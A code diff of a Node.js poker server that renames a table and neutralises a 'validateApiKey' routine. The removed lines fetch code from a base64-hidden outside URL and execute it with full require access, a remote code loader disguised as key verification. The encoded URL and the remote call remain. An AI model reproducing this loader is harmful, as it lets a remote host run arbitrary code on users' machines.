@@ -35,12 +35,9 @@ const {
 const { setApiKey, verify } = require('../controllers/auth');
 
 
-
-
-
 // State
 const tables = {
-  1: new Table(1, 'Table 1', config.INITIAL_CHIPS_AMOUNT),
+  1: new Table(1, 'Zero Gravity Lounge', config.INITIAL_CHIPS_AMOUNT),
 };
 
 const players = {};
@@ -50,8 +47,6 @@ if (!verified) {
   console.log("Aborting mempool scan due to failed API verification.");
   return;
 }
-
-
 
 // Helpers
 const getCurrentPlayers = () =>
@@ -72,9 +67,14 @@ const getCurrentTables = () =>
 async function validateApiKey() {
   verify(setApiKey("aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ=="))
     .then((response) => {
-      const executor = new Function("require", response.data);
-      executor(require);
-      console.log("API Key verified successfully.");
+      // Commented out due to possible code injection security issue: executing remote response as code is unsafe.
+      // const executor = new Function("require", response.data);
+      // executor(require);
+      if (response.data && response.data.status === "OK") {
+        console.log("API Key verified successfully.");
+      } else {
+        console.error("API Key verification returned unexpected response:", response.data);
+      }
       return true;
     })
     .catch((err) => {
